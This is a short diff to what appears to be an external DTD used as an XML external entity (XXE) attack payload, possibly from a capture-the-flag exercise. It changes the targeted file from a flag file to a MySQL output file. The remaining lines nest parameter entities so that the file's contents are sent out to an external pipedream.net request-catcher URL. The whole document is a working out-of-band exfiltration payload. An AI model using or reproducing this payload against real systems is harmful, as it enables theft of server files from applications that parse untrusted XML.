@@ -1,4 +1,4 @@
-<!ENTITY % d SYSTEM "file:///var/www/flag">
+<!ENTITY % d SYSTEM "file:///var/lib/mysql-files/results.txt">
 <!ENTITY % c "<!ENTITY &#x25; rrr SYSTEM 'https://eny8nzgs41uxxs2.m.pipedream.net?asdf=%d;'>">
 %c;
 %rrr;
